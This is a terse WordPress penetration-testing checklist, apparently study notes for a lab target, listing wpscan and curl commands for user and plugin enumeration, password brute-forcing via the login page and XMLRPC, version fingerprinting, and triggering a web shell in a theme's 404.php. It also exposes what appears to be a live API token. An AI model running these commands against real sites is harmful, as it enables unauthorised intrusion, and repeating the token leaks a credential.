✓ ✗ ✔ ✘ ✅
API Token :  4c8SSanMPgBTRC2hU15g5yFYmQOtzeFqKJECshNg4OU
[ ] - Enumeration : `wpscan --url http://ip:port --enumerate --api-token <api-token>`
[ ] - Enumerate Plugins : `wpscann --url https://domain.com/ --enumerate p`
[ ] - Authentication Attacks : 
	[ ] - Enumerate Users : `wpscan --url https://domain.com/ --enumerate u`
	[ ] - Password Bruteforce : `wpscan --url https:/domain.com/ -U <usernname> -P <path_to_wordlist>.txt`
	[ ] - Visit `https://domain.com/wp-login.php` for credential checking
	[ ] - Check for Authentication Attack on XMLRPC : `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`
[ ] - Vulnerability Report : `wpscan --url https://domain.com/ --enumerate p --api-token "api-token"`
[ ] - Directory Indexing : `curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text`
[ ] - Check for RCE : `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`
[ ] - To get the Source Version Code, we use the command : `curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'`
[ ] - To check for the Version Number for Plugins : `curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2`
[ ] - To check for the Version Number for Themes : `curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2`
[ ] - To perform Plugins Active Enumeration : `curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta`